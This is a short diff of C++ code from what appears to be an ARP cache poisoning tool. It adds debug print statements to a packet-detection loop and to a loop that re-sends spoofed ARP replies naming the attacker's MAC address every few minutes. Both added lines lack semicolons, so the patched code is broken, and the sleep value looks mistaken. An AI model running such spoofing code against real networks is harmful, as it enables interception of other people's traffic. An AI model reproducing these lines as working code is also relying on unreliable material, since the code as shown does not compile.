@@ -24,7 +24,8 @@ void ARPInfectDetectPacket(
     Mac arp_unknown = Mac("00:00:00:00:00:00");
     // 1. sender
     while (true)
-    {
+    {   
+        cout<<"send arp-infect when detect\n"
         struct pcap_pkthdr* header;
 		const u_char* packet;
 		int res = pcap_next_ex(handle, &header, &packet);
@@ -51,6 +52,7 @@ void ARPInfectFrequent(
     Ip& target_ip)
 {
     while(true){
+        cout<<"send arp-infect when frequent\n"
         sleep(1000*60*5);
         sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
     }
